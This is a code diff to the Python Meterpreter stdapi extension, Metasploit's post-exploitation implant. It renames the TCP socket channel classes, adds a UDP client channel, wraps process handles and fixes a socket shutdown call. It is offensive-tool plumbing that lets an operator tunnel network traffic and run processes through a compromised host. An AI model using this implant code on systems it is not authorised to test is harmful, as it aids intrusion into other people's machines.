@@ -871,7 +871,7 @@ def channel_open_stdapi_net_tcp_client(request, response):
             pass
     if not connected:
         return ERROR_CONNECTION_ERROR, response
-    channel_id = meterpreter.add_channel(MeterpreterSocketClient(sock))
+    channel_id = meterpreter.add_channel(MeterpreterSocketTCPClient(sock))
     response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
     return ERROR_SUCCESS, response
 
@@ -883,7 +883,19 @@ def channel_open_stdapi_net_tcp_server(request, response):
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_sock.bind((local_host, local_port))
     server_sock.listen(socket.SOMAXCONN)
-    channel_id = meterpreter.add_channel(MeterpreterSocketServer(server_sock))
+    channel_id = meterpreter.add_channel(MeterpreterSocketTCPServer(server_sock))
+    response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+    return ERROR_SUCCESS, response
+
+@register_function
+def channel_open_stdapi_net_udp_client(request, response):
+    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '0.0.0.0')
+    local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT).get('value', 0)
+    peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST)['value']
+    peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value', 0)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((local_host, local_port))
+    channel_id = meterpreter.add_channel(MeterpreterSocketUDPClient(sock, (peer_host, peer_port)))
     response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
     return ERROR_SUCCESS, response
 
@@ -1006,7 +1018,7 @@ def stdapi_sys_process_execute(request, response):
     response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
     response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
     if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
-        channel_id = meterpreter.add_channel(proc_h)
+        channel_id = meterpreter.add_channel(MeterpreterProcess(proc_h))
         response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
     return ERROR_SUCCESS, response
 
@@ -1686,7 +1698,7 @@ def stdapi_net_socket_tcp_shutdown(request, response):
     channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
     how = packet_get_tlv(request, TLV_TYPE_SHUTDOWN_HOW).get('value', socket.SHUT_RDWR)
     channel = meterpreter.channels[channel_id]
-    channel.shutdown(how)
+    channel.sock.shutdown(how)
     return ERROR_SUCCESS, response
 
 def _linux_get_maps():
